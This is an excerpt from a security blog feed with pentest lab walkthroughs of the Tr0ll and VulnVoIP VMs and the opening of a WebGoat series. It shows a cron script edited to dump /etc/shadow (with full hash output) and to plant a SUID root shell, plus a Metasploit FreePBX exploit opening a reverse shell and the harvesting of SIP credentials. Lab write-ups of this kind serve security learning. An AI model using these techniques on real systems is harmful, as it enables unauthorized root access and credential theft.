alternatives.log.1  dist-upgrade  fail2ban.log.1  upstart
apache2         dmesg     faillog     vmware-tools-upgrader.log
apt         dmesg.0   fsck        vsftpd.log
auth.log        dmesg.1.gz    installer   vsftpd.log.1
auth.log.1      dmesg.2.gz    kern.log    wtmp
boot.log        dmesg.3.gz    kern.log.1      wtmp.1
bootstrap.log       dmesg.4.gz    lastlog
btmp            dpkg.log      syslog
btmp.1          dpkg.log.1    syslog.1
$ cd /var/log
$ cat cronlog
*/2 * * * * cleaner.py
</code></p>

<p>So, that cleaner.py file seems to be a likely culprit. I searched for it and I found something interesting:</p>

<p>``` plain
$ locate cleaner.py
/lib/log/cleaner.py
/var/tmp/cleaner.py.swp
$ cat /lib/log/cleaner.py</p>

<h1>!/usr/bin/env python</h1>

<p>import os
import sys
try:</p>

<pre><code>os.system('rm -r /tmp/* ')
</code></pre>

<p>except:</p>

<pre><code>sys.exit()
</code></pre>

<p>$ cat /var/tmp/cleaner.py.swp
crontab for cleaner.py successful
```</p>

<p>Ok, so this cleaner deletes all the contents of the <code>/tmp/</code> folder. The great part about it though, is the wonderful permissions it has:</p>

<p><code>plain
$ ls -l /lib/log/cleaner.py
-rwxrwxrwx 1 root root 96 Aug 13 00:13 /lib/log/cleaner.py
</code></p>

<p>So we can modify it to help in compromising the system. First thing I did was add the following code to copy the contents of the <code>/etc/shadow</code> file to a txt file in the <em>/tmp/</em> folder:</p>

<p>``` python
with open(&lsquo;/etc/shadow&rsquo;, &lsquo;r&rsquo;) as shadow:</p>

<pre><code>juicy = shadow.read()
</code></pre>

<p>with open(&lsquo;/tmp/hashes.txt&rsquo;, &lsquo;a&rsquo;) as hashes:</p>

<pre><code>hashes.write(juicy)
</code></pre>

<p>```</p>

<p>Now we have the password hashes and we could crack them if we wanted:</p>

<p><code>plain
$ cat /tmp/hashes.txt
root:$6$mdQyunCS$qRhQug5j4xuM2vwsSlFJ0TrAVmfCV5h0VgKjbBp5BN2hL6ySxGL8Tt.qa2GlVotm7DFK7OUG9naqK6Kdf1aEZ.:16292:0:99999:7:::
daemon:*:16273:0:99999:7:::
bin:*:16273:0:99999:7:::
sys:*:16273:0:99999:7:::
sync:*:16273:0:99999:7:::
games:*:16273:0:99999:7:::
man:*:16273:0:99999:7:::
lp:*:16273:0:99999:7:::
mail:*:16273:0:99999:7:::
news:*:16273:0:99999:7:::
uucp:*:16273:0:99999:7:::
proxy:*:16273:0:99999:7:::
www-data:*:16273:0:99999:7:::
backup:*:16273:0:99999:7:::
list:*:16273:0:99999:7:::
irc:*:16273:0:99999:7:::
gnats:*:16273:0:99999:7:::
nobody:*:16273:0:99999:7:::
libuuid:!:16273:0:99999:7:::
syslog:*:16273:0:99999:7:::
messagebus:*:16291:0:99999:7:::
troll:$6$9WnrXzBm$ijsblc.QCK1kTlHCxiH5Dt3eUhZgEVaIpkIifyIx6EmPpD03xmIyPD6l/dVlUAE0Q4jGqaiusEkvb3BEDNcs6.:16292:0:99999:7:::
sshd:*:16291:0:99999:7:::
ftp:*:16292:0:99999:7:::
lololol:!:16292:0:99999:7:::
overflow:$6$RSQQWzPh$JB3Jm3liSEjq.ytLU2Hr.N6bTUEgkVtW5KSkCzVzvLf7zBT4eHuc0EUeEUPw3v5epKsZ9mLFfurV6gSUtpcZa.:16292:0:99999:7:::
ps-aux:$6$N8fO8B2w$ABHj.O2jTfIizBfrb0SpgN6VJLDujJ6o9wR4D0b4ZqqlfKQzW1M0xG0uTR4AZW77BFH0rsA2ZxnoGSMdwy3k00:16292:0:99999:7:::
maleus:$6$Y.Ev9AQx$IS.ikFcKj5.natBbOMMP3GiV9LJDjCQaHuvKoEeA1hPjhss8qLzjVPpuSnKysIF261sSnjOfoFjhpo.rO8qDg.:16292:0:99999:7:::
felux:$6$t0WWHdf0$9QYd6dc9XuZo.RwMRCdrzuTPTqaCJ47KAS7p1EitR2LVGJsOqjarTxD67WUhLQvmF3KOFIfgvN3rlw7cfU132.:16292:0:99999:7:::
Eagle11:$6$Pz9WUVEk$PPQQs334rlXCZRRY1w/uullgDaKeIMGNlzUXERsCl7zIrdulDtrcYD74t/mtw0yhqsJJQFXrZ08dpk0gEx0gX1:16292:0:99999:7:::
genphlux:$6$K2gip8vY$jcbwnoeCKqtu.9IkVbBNDJ3TAV0NcVSWgv2U3uYx1e942dcaD1NhxEpBklKAX1NnnrDCw6SU1Fw7vJ6tmOiCM/:16292:0:99999:7:::
usmc8892:$6$MlFBCUvT$YS7ZpyXavI6tGgYJW3fPFRbUlV2yhoHGir26minsRRBTTDf60NIwxi7PP3S8/vePYFBVVuSC0kfyBYeMnHnBO1:16292:0:99999:7:::
blawrg:$6$Pg7SOYWy$Ap9wmycvq0n2iR8CJNKcY/SBUrOqC4Dc8D6whHDnZNp8xqLCB/GF2Et4lHnhHehWkgObxSX5MZWofAc4QQSbj1:16292:0:99999:7:::
wytshadow:$6$Xw3TqkwY$O2Xx5JXO9DXSyqumRCBWa2fk0Z0glVUNty9nKkms4SlAKMtWwmHvNRHiIClPa4SGvCii0fCi5Xxg6gvoZrXhG0:16292:0:99999:7:::
vis1t0r:$6$nVShrZJb$ZAZ9nf4vzddUm1ISPO8gKgYweQopjc/Ta7jbEacYbDVOG1g8Y3LHwiJhU2NsDJljkn2Oc4xPJPeMpox5jSBHd0:16292:0:99999:7:::
root:$6$mdQyunCS$qRhQug5j4xuM2vwsSlFJ0TrAVmfCV5h0VgKjbBp5BN2hL6ySxGL8Tt.qa2GlVotm7DFK7OUG9naqK6Kdf1aEZ.:16292:0:99999:7:::
daemon:*:16273:0:99999:7:::
bin:*:16273:0:99999:7:::
sys:*:16273:0:99999:7:::
sync:*:16273:0:99999:7:::
games:*:16273:0:99999:7:::
man:*:16273:0:99999:7:::
lp:*:16273:0:99999:7:::
mail:*:16273:0:99999:7:::
news:*:16273:0:99999:7:::
uucp:*:16273:0:99999:7:::
proxy:*:16273:0:99999:7:::
www-data:*:16273:0:99999:7:::
backup:*:16273:0:99999:7:::
list:*:16273:0:99999:7:::
irc:*:16273:0:99999:7:::
gnats:*:16273:0:99999:7:::
nobody:*:16273:0:99999:7:::
libuuid:!:16273:0:99999:7:::
syslog:*:16273:0:99999:7:::
messagebus:*:16291:0:99999:7:::
troll:$6$9WnrXzBm$ijsblc.QCK1kTlHCxiH5Dt3eUhZgEVaIpkIifyIx6EmPpD03xmIyPD6l/dVlUAE0Q4jGqaiusEkvb3BEDNcs6.:16292:0:99999:7:::
sshd:*:16291:0:99999:7:::
ftp:*:16292:0:99999:7:::
lololol:!:16292:0:99999:7:::
overflow:$6$RSQQWzPh$JB3Jm3liSEjq.ytLU2Hr.N6bTUEgkVtW5KSkCzVzvLf7zBT4eHuc0EUeEUPw3v5epKsZ9mLFfurV6gSUtpcZa.:16292:0:99999:7:::
ps-aux:$6$N8fO8B2w$ABHj.O2jTfIizBfrb0SpgN6VJLDujJ6o9wR4D0b4ZqqlfKQzW1M0xG0uTR4AZW77BFH0rsA2ZxnoGSMdwy3k00:16292:0:99999:7:::
maleus:$6$Y.Ev9AQx$IS.ikFcKj5.natBbOMMP3GiV9LJDjCQaHuvKoEeA1hPjhss8qLzjVPpuSnKysIF261sSnjOfoFjhpo.rO8qDg.:16292:0:99999:7:::
felux:$6$t0WWHdf0$9QYd6dc9XuZo.RwMRCdrzuTPTqaCJ47KAS7p1EitR2LVGJsOqjarTxD67WUhLQvmF3KOFIfgvN3rlw7cfU132.:16292:0:99999:7:::
Eagle11:$6$Pz9WUVEk$PPQQs334rlXCZRRY1w/uullgDaKeIMGNlzUXERsCl7zIrdulDtrcYD74t/mtw0yhqsJJQFXrZ08dpk0gEx0gX1:16292:0:99999:7:::
genphlux:$6$K2gip8vY$jcbwnoeCKqtu.9IkVbBNDJ3TAV0NcVSWgv2U3uYx1e942dcaD1NhxEpBklKAX1NnnrDCw6SU1Fw7vJ6tmOiCM/:16292:0:99999:7:::
usmc8892:$6$MlFBCUvT$YS7ZpyXavI6tGgYJW3fPFRbUlV2yhoHGir26minsRRBTTDf60NIwxi7PP3S8/vePYFBVVuSC0kfyBYeMnHnBO1:16292:0:99999:7:::
blawrg:$6$Pg7SOYWy$Ap9wmycvq0n2iR8CJNKcY/SBUrOqC4Dc8D6whHDnZNp8xqLCB/GF2Et4lHnhHehWkgObxSX5MZWofAc4QQSbj1:16292:0:99999:7:::
wytshadow:$6$Xw3TqkwY$O2Xx5JXO9DXSyqumRCBWa2fk0Z0glVUNty9nKkms4SlAKMtWwmHvNRHiIClPa4SGvCii0fCi5Xxg6gvoZrXhG0:16292:0:99999:7:::
vis1t0r:$6$nVShrZJb$ZAZ9nf4vzddUm1ISPO8gKgYweQopjc/Ta7jbEacYbDVOG1g8Y3LHwiJhU2NsDJljkn2Oc4xPJPeMpox5jSBHd0:16292:0:99999:7:::
</code></p>

<p>But I am not a fan of cracking passwords, if it can be avoided. And in this case, we still have the other Python file to check. So I modified the cleaner code again:</p>

<p>``` python
with open(&lsquo;/opt/lmao.py&rsquo;, &lsquo;r&rsquo;) as lmao:</p>

<pre><code>lol = lmao.read()
</code></pre>

<p>with open(&lsquo;/tmp/lol.py&rsquo;, &lsquo;a&rsquo;) as rofl:</p>

<pre><code>rofl.write(lol)
</code></pre>

<p>```</p>

<p>And after a little bit of waiting, we finally have the culprit that is killing our shells:</p>

<p>``` plain
$ cat /tmp/lol.py</p>

<h1>!/usr/bin/env python</h1>

<p>import os</p>

<p>os.system(&lsquo;echo &ldquo;TIMES UP LOL!&rdquo;|wall&rsquo;)
os.system(&ldquo;pkill -u &lsquo;overflow&rsquo;&rdquo;)
sys.exit()
```</p>

<p>Ok, now let&rsquo;s finish by getting a shell. We can leverage the cleaner file to copy the shell executable and give it outrageously lax permissions and SUID bit. Note that I&rsquo;m not saying bash, because the shell being used here is the <em>sh</em> shell.</p>

<p><code>plain
$ echo $SHELL
/bin/sh
</code></p>

<p>Here is the simple code for copying the shell file to <em>/tmp/</em> and letting everyone run it with root permissions:</p>

<p>``` python
import os</p>

<p>os.system(&lsquo;cp /bin/sh /tmp/trolled&rsquo;)
os.system(&lsquo;chmod 4777 /tmp/trolled&rsquo;)
```</p>

<p>Now just wait for cron. Check the loot and pwn the troll!</p>

<p>``` plain
$ ls -l /tmp/trolled
-rwsrwxrwx 1 root root 112204 Feb  3 04:50 /tmp/trolled
$ /tmp/trolled</p>

<h1>whoami</h1>

<p>root</p>

<h1>ls /root/</h1>

<p>proof.txt</p>

<h1>cat /root/proof.txt</h1>

<p>Good job, you did it!</p>

<p>702a8c18d29c6f3ca0d99ef5712bfbdc
```</p>

<p>Alternatively, since the original objective was only to read the proof file, you can just use the cleaner file to do it, providing you know the name of the proof file:</p>

<p>``` python
with open(&lsquo;/root/proof.txt&rsquo;, &lsquo;r&rsquo;) as proof:</p>

<pre><code>win = proof.read()
</code></pre>

<p>with open(&lsquo;/tmp/proof.txt&rsquo;, &lsquo;a&rsquo;) as pwned:</p>

<pre><code>pwned.write(win)
</code></pre>

<p>```</p>

<p>And here it is:</p>

<p>``` plain
$ cat /tmp/proof.txt
Good job, you did it!</p>

<p>702a8c18d29c6f3ca0d99ef5712bfbdc
```</p>

<p>Fortune cookie:</p>

<blockquote><p>He that breaks a thing to find out what it is has left the path of wisdom.
  &mdash; J.R.R. Tolkien</p></blockquote>

<p><strong>Random rant</strong></p>

<p>I started this post in 2014 and completed it in 2015! Who&rsquo;s the troll now?</p>

<p>Been busy and inactive for a couple of months, but I am back now and hopefully without such long pauses between posts.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - VulnVoIP]]></title>
    <link href="http://chousensha.github.io/blog/2014/10/07/pentest-lab-vulnvoip/"/>
    <updated>2014-10-07T19:07:46+03:00</updated>
    <id>http://chousensha.github.io/blog/2014/10/07/pentest-lab-vulnvoip</id>
    <content type="html"><![CDATA[<p>I found a very interesting virtual machine on VulnHub that focuses on VoIP vulnerabilities. Since I haven&rsquo;t seen any other VoIP resources, I thought it would be great to give this a try.</p>

<blockquote><p>VulnVoIP is based on a relatively old AsteriskNOW distribution and has a number of
weaknesses. The aim is to locate VoIP users, crack their passwords and gain access
to the Support account voicemail.</p></blockquote>

<!-- more -->


<p>The IP of the target machine is 192.168.80.131. Here are the results of the port scan:</p>

<p>``` plain
nmap -A -p1-65535 192.168.80.131</p>

<p>Starting Nmap 6.47 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-10-07 19:45 EEST
Nmap scan report for 192.168.80.131
Host is up (0.00023s latency).
Not shown: 65527 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey:
|   1024 1f:e2:e8:9e:2c:f8:31:39:36:f7:1d:aa:77:5e:ac:76 (DSA)
|<em>  2048 38:a4:9d:29:8a:11:9d:e1:13:5d:5e:6d:76:a6:63:76 (RSA)
53/tcp   open  domain     dnsmasq 2.45
| dns-nsid:
|</em>  bind.version: dnsmasq-2.45
80/tcp   open  http       Apache httpd 2.2.3 ((CentOS))
| http-methods: Potentially risky methods: TRACE
|<em>See <a href="http://nmap.org/nsedoc/scripts/http-methods.html">http://nmap.org/nsedoc/scripts/http-methods.html</a>
| http-robots.txt: 1 disallowed entry
|</em>/
|<em>http-title: FreePBX
111/tcp  open  rpcbind    2 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100024  1            966/udp  status
|</em>  100024  1            969/tcp  status
969/tcp  open  status     1 (RPC #100024)
3306/tcp open  mysql      MySQL (unauthorized)
4445/tcp open  upnotifyp?
5038/tcp open  asterisk   Asterisk Call Manager 1.1
MAC Address: 00:0C:29:84:8C:CC (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.18 &ndash; 2.6.32
```</p>

<p>Let&rsquo;s look at that DNS server first:</p>

<blockquote><p>dnsmasq is a lightweight DNS, TFTP and DHCP server. It is intended to provide coupled DNS and DHCP service to a LAN.</p>

<p>Dnsmasq accepts DNS queries and either answers them from a small, local, cache or forwards them to a real, recursive, DNS server. It loads the
contents of /etc/hosts so that local hostnames which do not appear in the global DNS can be resolved and also answers DNS queries for DHCP
configured hosts.</p>

<p>The dnsmasq DHCP server supports static address assignments and multiple networks. It automatically sends a sensible default set of DHCP options,
and can be configured to send any desired set of DHCP options, including vendor-encapsulated options. It includes a secure, read-only, TFTP server
to allow net/PXE boot of DHCP hosts and also supports BOOTP.</p>

<p>Dnsmasq supports IPv6 for DNS, but not DHCP.</p></blockquote>

<p>There is a Heap Overflow and Null-pointer Dereference vulnerability affecting the TFTP server component:</p>

<p><strong>CVE-2009-2957</strong></p>

<blockquote><p>A vulnerability has been found that may allow an attacker to execute arbitrary code on
servers or home routers running dnsmasq with the TFTP service
enabled (&lsquo;&mdash;enable-tfp&rsquo;). This service is not enabled by default on most
distributions; in particular it is not enabled by default on OpenWRT or
DD-WRT. Chances of successful exploitation increase when a long
directory prefix is used for TFTP. Code will be executed with the
privileges of the user running dnsmasq, which is normally a
non-privileged one.</p>

<p>Additionally there is a potential DoS attack to the TFTP service by
exploiting a null-pointer dereference vulnerability.</p></blockquote>

<p>I wasn&rsquo;t able to exploit this though, so moving on.</p>

<p>Navigating to the web page, we see two links, for Voicemail &amp; Recordings (ARI) and FreePBX Administration. The administration page requires HTTP authentication, and the other one is a login portal.</p>

<p>A Nessus scan revealed that the Asterisk Recording Interface uses a default set of credentials for the administrator&rsquo;s account: <em>admin</em>/<em>ari_password</em>, on the URL <a href="http://192.168.80.131/recordings/index.php">http://192.168.80.131/recordings/index.php</a> . I didn&rsquo;t find anything useful even after logging in. These credentials didn&rsquo;t work on the admin page at <a href="http://192.168.80.131/admin/config.php">http://192.168.80.131/admin/config.php</a> , but I was able to glean the FreePBX version from the webpage (2.7.0.0). Might come in handy later!</p>

<p>Since this is my first time doing anything remotely related to VoIP, I had some googling and reading to do. For a while I just digressed from the main goal of hacking this machine to burying myself in the Session Initiation Protocol RFC (ouch!), and 2 books: <a href="http://www.amazon.com/Hacking-Exposed-VoIP-Security-Solutions/dp/0072263644">Hacking Exposed VoIP: Voice Over IP Security Secrets &amp; Solutions</a> and <a href="http://www.amazon.com/Hacking-VoIP-Protocols-Attacks-Countermeasures/dp/1593271638">Hacking VoIP: Protocols, Attacks, and Countermeasures</a>.</p>

<p>So, a short introduction to SIP is in order:</p>

<blockquote><p> SIP is an application-layer control protocol that can establish,
modify, and terminate multimedia sessions (conferences) such as
Internet telephony calls. SIP can also invite participants to
already existing sessions, such as multicast conferences.</p>

<p>SIP employs design elements similar to the HTTP request/response transaction model. Each transaction consists of a client request that invokes a
particular method or function on the server and at least one response. SIP reuses most of the header fields, encoding rules and status codes of
HTTP, providing a readable text-based format.</p>

<p>Each resource of a SIP network, such as a user agent or a voicemail box, is identified by a URI, based on the general standard syntax also used in
Web services and e-mail. The URI scheme used for SIP is sip: and a typical SIP URI is of the form: sip:username:password@host:port</p>

<p>SIP clients typically use TCP or UDP on port numbers 5060 and/or 5061 to connect to SIP servers and other SIP endpoints. Port 5060 is commonly
used for non-encrypted signaling traffic whereas port 5061 is typically used for traffic encrypted with TLS. SIP is primarily used in setting up
and tearing down voice or video calls.</p></blockquote>

<p><strong>SIP Requests</strong></p>

<ul>
<li><p>INVITE &ndash; A client is being invited to participate in a call.</p></li>
<li><p>ACK &ndash; The client has confirmed the INVITE request.</p></li>
<li><p>BYE &ndash; The call has been terminated by either the caller or callee.</p></li>
<li><p>CANCEL &ndash; Cancel any pending requests.</p></li>
<li><p>OPTIONS &ndash; Queries the server for its capabilities.</p></li>
<li><p>REGISTER &ndash; Registers the client with the server according to the address in the To header.</p></li>
<li><p>PRACK &ndash; Similar to ACK, but a provisional confirmation.</p></li>
<li><p>SUBSCRIBE &ndash; Subscribes the device for an event notification.</p></li>
<li><p>NOTIFY &ndash; Notifies all subscribers of an event.</p></li>
<li><p>PUBLISH &ndash; Publishes an event to a server.</p></li>
<li><p>INFO &ndash; Sends information in the middle of a session that doesn&rsquo;t modify the session&rsquo;s state.</p></li>
<li><p>REFER &ndash; Asks the client to issue a SIP request, typically a call transfer.</p></li>
<li><p>MESSAGE &ndash; Sends an instant message using SIP.</p></li>
<li><p>UPDATE &ndash; Modifies a session&rsquo;s state without altering the dialog state.</p></li>
</ul>


<p>And, a little about Asterisk and FreePBX:</p>

<blockquote><p>Asterisk is a software implementation of a telephone private branch exchange (PBX). Like any PBX, it allows attached telephones to make calls to
one another, and to connect to other telephone services, such as the public switched telephone network (PSTN) and Voice over Internet Protocol
(VoIP) services.</p>

<p>FreePBX is an open source GUI that controls and manages Asterisk</p></blockquote>

<p>I found an awesome tool suite for this challenge: <a href="https://code.google.com/p/sipvicious/">SIPVicious</a></p>

<blockquote><p>SIPVicious suite is a set of tools that can be used to audit SIP based VoIP systems. It currently consists of the folowing tools:</p>

<p>svmap &ndash; this is a sip scanner. Lists SIP devices found on an IP range</p>

<p>svwar &ndash; identifies active extensions on a PBX</p>

<p>svcrack &ndash; an online password cracker for SIP PBX</p>

<p>svreport &ndash; manages sessions and exports reports to various formats</p>

<p>svcrash &ndash; attempts to stop unauthorized svwar and svcrack scans</p></blockquote>

<p>Let&rsquo;s get started then!</p>

<p>``` plain
./svmap.py 192.168.80.1/24</p>

<h2>| SIP Device          | User Agent            | Fingerprint |</h2>

<p>| 192.168.80.131:5060 | Asterisk PBX 1.6.2.11 | disabled    |
```</p>

<p>Now we also have the Asterisk version. Next, we need to find valid extensions (it took a while of trial and error to get meaningful information on this one):</p>

<p>``` plain
./svwar.py -D -m INVITE 192.168.80.131
WARNING:TakeASip:using an INVITE scan on an endpoint (i.e. SIP phone) may cause it to ring and wake up people in the middle of the night
WARNING:TakeASip:extension &lsquo;100&rsquo; probably exists but the response is unexpected
WARNING:TakeASip:extension &lsquo;100&rsquo; probably exists but the response is unexpected</p>

<h2>| Extension | Authentication |</h2>

<p>| 201       | reqauth        |
| 200       | reqauth        |
| 2000      | reqauth        |
| 102       | reqauth        |
| 100       | weird          |
| 101       | reqauth        |
```</p>

<p>The -D option enables scanning for default extensions, and the -m option specifies a request method (INVITE indicates that a client is being invited to participate in a call session.)</p>

<p>If you read the VM description on VulnHub, you probably remember that it mentions an easy way to get root to the machine. I found an exploit for that in Metasploit, more info here: <a href="http://www.offensive-security.com/vulndev/freepbx-exploit-phone-home/">http://www.offensive-security.com/vulndev/freepbx-exploit-phone-home/</a></p>

<p>``` plain
use exploit/unix/http/freepbx_callmenum</p>

<p>msf exploit(freepbx_callmenum) > show options</p>

<p>Module options (exploit/unix/http/freepbx_callmenum):</p>

<p>   Name       Current Setting  Required  Description</p>

<hr />

<p>   EXTENSION  2000-2001        yes       A range of Local extension numbers
   Proxies                     no        Use a proxy chain
   RHOST      192.168.80.131   yes       The target address
   RPORT      80               yes       The target port
   VHOST                       no        HTTP server virtual host</p>

<p>Payload options (generic/shell_reverse_tcp):</p>

<p>   Name   Current Setting  Required  Description</p>

<hr />

<p>   LHOST  192.168.80.130   yes       The listen address
   LPORT  4444             yes       The listen port</p>

<p>Exploit target:</p>

<p>   Id  Name</p>

<hr />

<p>   0   Automatic Target
```</p>

<p>I specified the extension to match one of those that we previously discovered. And the machine belongs to us now!</p>

<p>``` plain
msf exploit(freepbx_callmenum) > exploit</p>

<p>[<em>] Started reverse handler on 192.168.80.130:4444
[</em>] 192.168.80.131:80 &ndash; Sending evil request with range 2000
[<em>] 192.168.80.131:80 &ndash; Sending evil request with range 2001
[</em>] Command shell session 1 opened (192.168.80.130:4444 &ndash;> 192.168.80.131:47268) at 2014-10-14 14:42:29 +0300</p>

<p>whoami
root
```</p>

<p>But we are not done. We still have to find the usernames and passwords, and get the voicemail from the Support account. I googled a bit for a helpful configuration file, which turned out to be the <code>amportal.conf</code> file:</p>

<p>``` plain
cat /etc/amportal.conf</p>

<h1>This file is part of FreePBX.</h1>

<p>#</p>

<h1>FreePBX is free software: you can redistribute it and/or modify</h1>

<h1>it under the terms of the GNU General Public License as published by</h1>

<h1>the Free Software Foundation, either version 2 of the License, or</h1>

<h1>(at your option) any later version.</h1>

<p>#</p>

<h1>FreePBX is distributed in the hope that it will be useful,</h1>

<h1>but WITHOUT ANY WARRANTY; without even the implied warranty of</h1>

<h1>MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</h1>

<h1>GNU General Public License for more details.</h1>

<p>#</p>

<h1>You should have received a copy of the GNU General Public License</h1>

<h1>along with FreePBX.  If not, see <a href="http://www.gnu.org/licenses/">http://www.gnu.org/licenses/</a>.</h1>

<p>#</p>

<h1>This file contains settings for components of the Asterisk Management Portal</h1>

<h1>Spaces are not allowed!</h1>

<h1>Run /usr/src/AMP/apply_conf.sh after making changes to this file</h1>

<h1>AMPDBHOST: the host to connect to the database named &lsquo;asterisk&rsquo;</h1>

<p>AMPDBHOST=localhost</p>

<h1>AMPDBUSER: the user to connect to the database named &lsquo;asterisk&rsquo;</h1>

<p>AMPDBUSER=freepbx</p>

<h1>AMPDBENGINE: the type of database to use</h1>

<p>AMPDBENGINE=mysql</p>

<h1>AMPDBPASS: the password for AMPDBUSER</h1>

<p>AMPDBPASS=fpbx</p>

<h1>AMPENGINE: the telephony backend engine to use</h1>

<p>AMPENGINE=asterisk</p>

<h1>AMPMGRUSER: the user to access the Asterisk manager interface</h1>

<p>AMPMGRUSER=admin</p>

<h1>AMPMGRPASS: the password for AMPMGRUSER</h1>

<p>AMPMGRPASS=amp111
&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;.</p>

<h1>AUTHTYPE: authentication type to use for web admin</h1>

<h1>If type set to &lsquo;database&rsquo;, the primary AMP admin credentials will be the AMPDBUSER/AMPDBPASS above</h1>

<h1>valid: none, database</h1>

<p>AUTHTYPE=database</p>

<p>```</p>

<p>We have the username and password for the admin interface now.</p>

<p><img class="center" src="/images/pentest/vulnvoip/webadmin.png" title="&lsquo;freepbx webadmin&rsquo; &lsquo;webadmin interface&rsquo;" ></p>

<p>If we go to Panel, we can see that 2000 is the extension for the Support account. But I still couldn&rsquo;t find a way to actually listen to the voicemail message, and I don&rsquo;t have the password. But, I also have the credentials for the Asterisk Login Manager, so let&rsquo;s see if that helps. To login and authenticate to the manager, you must send a &ldquo;login&rdquo; action, with your user name and secret (password) as parameters. We can use telnet for this (don&rsquo;t forget to hit Enter twice after inputting the parameters):</p>

<p>``` plain
telnet 192.168.80.131 5038
Trying 192.168.80.131&hellip;
Connected to 192.168.80.131.
Escape character is &lsquo;^]&rsquo;.
Asterisk Call Manager/1.1
action: login
username: admin
secret: amp111</p>

<p>Response: Success
Message: Authentication accepted
```</p>

<p>For a comprehensive list of Asterisk commands, check out this <a href="http://www.voip-info.org/wiki/view/Asterisk+CLI">Asterisk CLI resource</a> and <a href="http://www.voip-info.org/wiki/view/Asterisk+manager+API">Manager Actions</a>. To list the SIP users, we have to use a &ldquo;command&rdquo; action this time. And then specify the command, which is <code>sip show users</code>:</p>

<p>``` plain
action: command
command: sip show users</p>

<p>Response: Follows
Privilege: Command
Username                   Secret           Accountcode      Def.Context      ACL  NAT     <br/>
100                                                          from-internal    Yes  Always  <br/>
101                        s3cur3                            from-internal    Yes  Always  <br/>
102                        letmein123                        from-internal    Yes  Always  <br/>
201                        secret123                         from-internal    Yes  Always  <br/>
200                        quit3s3curE123                    from-internal    Yes  Always  <br/>
2000                       password123                       from-internal    Yes  Always  <br/>
&mdash;END COMMAND&mdash;
```</p>

<p>And it was this easy to get the usernames and passwords! I should have started with that! Now it&rsquo;s possible to dial the extension and listen to the voicemail message. I just randomly chose Jitsi as a VoIP client for this task. You have to download and install the package file:</p>

<p><code>plain
wget https://download.jitsi.org/jitsi/debian/jitsi_2.5-latest_amd64.deb
dpkg -i jitsi_2.5-latest_amd64.deb
</code></p>

<p>Next, create an account in Jitsi:</p>

<p><img class="center" src="/images/pentest/vulnvoip/jitsi.png" title="&lsquo;jitsi&rsquo; &lsquo;jitsi&rsquo;" ></p>

<p>However, when you make the call, it asks for a voicemail password! I went back to my shell on the machine and to googling about Asterisk voicemail paswords. The configuration file that comes to the rescue is <code>/etc/asterisk/voicemail.conf</code>.</p>

<p>``` plain
cat /etc/asterisk/voicemail.conf
[general]</p>

<h1>include vm_general.inc</h1>

<h1>include vm_email.inc</h1>

<p>[default]</p>

<p>2000 => 0000,Support,,,attach=no|saycid=no|envelope=no|delete=no
```</p>

<p>So, the password is 0000, and we can now listen to the message, which I&rsquo;ll type here for the sake of completeness (hope I got it right):</p>

<blockquote><p>&ldquo;Hey Mark, I think the support web access account has been compromised. I have changed the password to securesupport123, all one word in
lowercase. You can log on at the usual address. See you in the morning&rdquo;</p></blockquote>

<p>Well, I really liked this challenge! It made me read up about various subjects I wasn&rsquo;t familiar with, like Asterisk and SIP. I also discovered the SIPVicious suite, which should come in handy from now on. And it was a great feeling to finally hear the message at the end. Also, VoIP hacking is a very interesting topic, and I hope there will be more chances to practice and learn about it.</p>

<blockquote><p>FORTUNE PROVIDES QUESTIONS FOR THE GREAT ANSWERS: #31</p>

<p>Q:    What is the name of the world&rsquo;s oldest kamikaze pilot?</p>

<p>A:    Chicken Teriyaki.</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - WebGoat]]></title>
    <link href="http://chousensha.github.io/blog/2014/08/15/pentest-lab-webgoat/"/>
    <updated>2014-08-15T23:17:44+03:00</updated>
    <id>http://chousensha.github.io/blog/2014/08/15/pentest-lab-webgoat</id>
    <content type="html"><![CDATA[<p>The next target in my web penetration testing series will be WebGoat. So, what is WebGoat?</p>

<!-- more -->


<blockquote><p>WebGoat is a deliberately insecure web application maintained by OWASP designed to
teach web application security lessons. In each lesson, users must demonstrate their
understanding of a security issue by exploiting a real vulnerability in the WebGoat
applications. The application is a realistic teaching environment, providing users
with hints and code to further explain the lesson.</p></blockquote>

<p>I used the standard install that contains the Java Runtime Environment and Tomcat server, in addition to the web application itself. If you follow the installation instructions you should be fine, but in case you get a <em>Please set JAVA_HOME to a Java 1.6 JDK install</em> message, remember to point the environment variable to your Java JDK location. In my case, it looked like this: <code>export JAVA_HOME=/usr/lib/jvm/java-6-openjdk-amd64</code></p>

<p>Then navigate to <a href="http://localhost:8080/WebGoat/attack">http://localhost:8080/WebGoat/attack</a> (or whatever port you used to start it on). The credentials are <em>guest/guest</em>. You can see from the menu that there are many attack categories. So, let&rsquo;s begin!</p>

<h3>General</h3>

<p><strong>HTTP Basics</strong></p>

<p><img class="center" src="/images/webgoat/http_basics.png" title="&lsquo;http basics&rsquo; &lsquo;http basics&rsquo;" ></p>

<p><strong>Concept / Topic To Teach:</strong></p>

<p>This lesson presents the basics for understanding the transfer of data between the browser and the web application.</p>

<p><strong>How HTTP works:</strong></p>

<p>All HTTP transactions follow the same general format. Each client request and server response has three parts: the request or response line, a header section, and the entity body. The client initiates a transaction as follows:</p>

<p>The client contacts the server and sends a document request</p>

<p><em>GET /index.html?param=value HTTP/1.0</em></p>

<p>Next, the client sends optional header information to inform the server of its configuration and the document formats it will accept.</p>

<p><em>User-Agent: Mozilla/4.06 Accept: image/gif,image/jpeg, <em>/</em></em></p>

<p>After sending the request and headers, the client may send additional data. This data is mostly used by CGI programs using the POST method.</p>

<p><strong>My solution</strong></p>

<p>Well, nothing fancy here. Just enter something in the text box. This is just a warmup.</p>

<p><strong>HTTP Splitting</strong></p>

<p><img class="center" src="/images/webgoat/http_split.png" title="&lsquo;http splitting&rsquo; &lsquo;http splitting&rsquo;" ></p>

